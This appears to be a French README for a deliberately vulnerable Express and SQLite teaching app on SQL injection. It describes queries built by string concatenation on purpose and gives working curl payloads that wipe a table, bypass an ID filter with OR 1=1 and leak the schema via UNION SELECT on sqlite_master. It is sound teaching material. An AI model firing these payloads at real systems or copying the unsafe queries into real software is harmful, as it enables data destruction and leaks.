# Guide du projet et démonstrations d'injection SQL

## Objectif du dépôt
Ce dépôt propose une application Express minimaliste écrite en TypeScript pour illustrer les failles d'injection SQL. Le serveur expose trois routes REST :
- `POST /messages` pour insérer un message dans SQLite.
- `GET /messages` pour récupérer tous les messages.
- `GET /messages/:id` pour lire un message spécifique.

Les gestionnaires renvoient directement les objets/metadonnées récupérés par la base (`application/json`). La configuration TypeScript/ESM (`tsx`, `typescript`, `better-sqlite3`) est déjà prête pour être exécutée via `npm run dev`, `npm start`, ou compilée avec `npm run build`.

## Pourquoi les injections fonctionnent-elles ?
Le fichier `src/lib/database.ts` contient volontairement des requêtes construites par concaténation de chaînes :
- `insertMessage(body)` exécute `INSERT INTO messages (body) VALUES ('${body}')` sans paramètres.
- `findMessageById(id)` exécute `SELECT ... WHERE id = ${id}`.

Ces requêtes acceptent directement l'entrée utilisateur, ce qui permet au public d'expérimenter des charges utiles (`payloads`) classiques.

## Scénarios couverts dans les tests
Le fichier `src/test/app.test.ts` regroupe les démonstrations principales :
1. **Suppression de données** : `POST /messages` avec `'); DELETE FROM messages; --` vide la table.
2. **Bypass de filtrage** : `GET /messages/0 OR 1=1` retourne le premier enregistrement, même si l'ID demandé n'existe pas.
3. **Fuite de schéma** : une requête `GET /messages/0 UNION SELECT 1, name, ...` révèle le schéma `CREATE TABLE ...` de tables internes (`sqlite_master`).

Chaque scénario construit une requête malveillante, appelle directement les gestionnaires Express (sans serveur HTTP), et vérifie le comportement obtenu via des objets réponse simulés.

### Exemples cURL

#### 1. Insertion légitime
```bash
curl -X POST http://localhost:3000/messages \
  -H 'Content-Type: application/json' \
  -d '{"body":"Bonjour tout le monde"}'
```

#### 1bis. Suppression de la table via injection
```bash
curl -X POST http://localhost:3000/messages \
  -H 'Content-Type: application/json' \
  -d "{\"body\":\"'); DELETE FROM messages; --\"}"
```

#### 2. Lecture légitime de la liste
```bash
curl http://localhost:3000/messages
```

#### 2bis. Lecture d'un message précis
```bash
curl http://localhost:3000/messages/1
```

#### 2ter. Bypass de filtrage par injection
```bash
curl http://localhost:3000/messages/0%20OR%201=1
```

#### 3. Fuite de schéma
```bash
curl "http://localhost:3000/messages/0%20UNION%20SELECT%201,%20sql,%20'1970-01-01T00:00:00'%20FROM%20sqlite_master%20WHERE%20type='table'%20LIMIT%201%20OFFSET%201--"
```

## Recommandations pédagogiques
- Utilisez `SQLITE_DB_PATH=':memory:'` pour isoler les sessions d'exécution.
- Montrez d'abord la route légitime, puis réexécutez la même route avec la charge utile injectée.
- Concluez en montrant comment des requêtes préparées évitent ces vulnérabilités, même si le dépôt n'applique pas ce correctif pour préserver l'exemple.
